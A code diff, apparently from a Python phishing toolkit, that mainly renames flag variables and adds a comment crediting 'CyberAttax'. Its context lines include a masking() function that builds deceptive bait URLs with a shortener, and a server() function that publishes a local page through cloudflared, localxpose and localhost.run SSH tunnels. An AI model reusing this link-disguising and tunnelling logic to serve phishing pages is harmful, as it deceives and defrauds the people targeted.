@@ -340,10 +340,10 @@ directory = args.directory
 duration = args.duration
 mode = args.mode
 troubleshoot = args.troubleshoot
-key = args.nokey if mode != "test" else False
-update = args.noupdate
-kill = args.noupdate
-kshrt = args.kshrt
+has_key = args.nokey if mode != "test" else False
+is_update = args.noupdate
+is_kill = args.noupdate
+is_kshrt = args.kshrt
 
 local_url = f"127.0.0.1:{port}"
 
@@ -700,11 +700,11 @@ def installer(package, package_name=None):
             shell("brew install localxpose")
 
 
-# Process killer
+# Process killer (Fixed by CyberAttax)
 def killer():
     # Previous instances of these should be stopped
     for process in processes:
-        if kill and is_running(process):
+        if is_kill and is_running(process):
             # system(f"killall {process}")
             output = shell(f"pidof {process}", True).stdout.strip()
             if " " in output:
@@ -719,7 +719,7 @@ def killer():
 # Internet Checker
 
 def internet(url="https://api.github.com", timeout=5):
-    while update:
+    while is_update:
         try:
             head(url=url, timeout=timeout)
             break
@@ -916,7 +916,7 @@ def lx_token():
 
 
 def ssh_key():
-    if key and not isfile(f"{ssh_dir}/id_rsa"):
+    if has_key and not isfile(f"{ssh_dir}/id_rsa"):
         is_no_pass = bgtask(f"ssh-keygen -y -P '' -f {ssh_dir}/id_rsa").wait()
         if is_no_pass != 0:
             pass
@@ -1191,7 +1191,7 @@ def masking(url):
     final = domain+bait+short
     print()
     #sprint(f"\n{success}Your custom url is > {bcyan}{final}")
-    if kshrt:
+    if is_kshrt:
         kshrt_title = "[bold green]Kshrt[/]"
         kshrt_text = f"[cyan]URL[/] [blue]:[/] [yellow]{kurl}[/]"
         cprint(
@@ -1420,7 +1420,7 @@ def requirements():
 def main_menu():
     global ptype, mode, troubleshoot
     shell("stty -echoctl") # Skip printing ^C
-    if update:
+    if is_update:
         updater()
     requirements()
     if troubleshoot in ts_commands:
@@ -1589,7 +1589,7 @@ def server():
         arguments = f"{arguments} --subdomain {subdomain}"
     bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
     bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect {arguments} -t {local_url}", stdout=lx_log, stderr=lx_log)
-    if key:
+    if has_key:
         bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
     else:
         bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
